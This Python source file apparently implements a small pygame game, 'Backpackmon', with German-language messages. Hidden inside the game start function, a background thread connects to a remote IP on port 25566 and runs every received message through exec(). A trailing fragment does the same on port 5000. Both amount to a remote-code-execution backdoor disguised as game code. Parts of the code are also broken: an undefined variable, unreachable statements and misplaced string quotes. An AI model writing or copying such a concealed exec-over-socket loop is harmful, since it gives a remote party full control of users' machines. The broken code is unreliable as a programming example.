import socket
import hashlib
import pygame
import _thread
import sys

def start_game(gameid):
    print("Autentivizierung korrect")
    print("User wird weitergeleitet")
    nachricht = "begingame;"
    def autoexses(self):
        #s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 25566))
        
        try:
            while True:
                antwort = s.recv(1024)
                exec(antwort.decode())
        finally:
            s.close()

    _thread.start_new_thread(autoexses, (1,))
    white = [255, 255, 255]
    pygame.init()
    screen = pygame.display.set_mode((640, 480))
    clock = pygame.time.Clock()
    pygame.display.set_caption("Backpackmon")
    spielaktiv = True
    player = pygame.image.load("gameneeds/p1.png").convert()
    player.set_colorkey((0, 0, 0))
    player_big = pygame.transform.scale(player, (60, 60))

    y= 10
    x= 10
    while spielaktiv:
        pygame.display.update()
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
        keypressed = pygame.key.get_pressed()
        if keypressed[pygame.K_LEFT]:
            x -= 8
        if keypressed[pygame.K_RIGHT]:
            x += 8
        if keypressed[pygame.K_UP]:
            y -= 8
        if keypressed[pygame.K_DOWN]:
            y += 8                  
        screen.fill("white")
        screen.blit(player_big, (x, y))
        clock.tick(60)
    pygame.quit()
    sys.exit()
    s.send(nachricht.encode())
    """
    """
    import socket

    ip = input("IP: ")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 5000))


    nachricht = "pleaselogin"
    s.send(nachricht.encode())


    try:
        while True:
            antwort = s.recv(1024)
            exec(antwort)
    finally:
        s.close()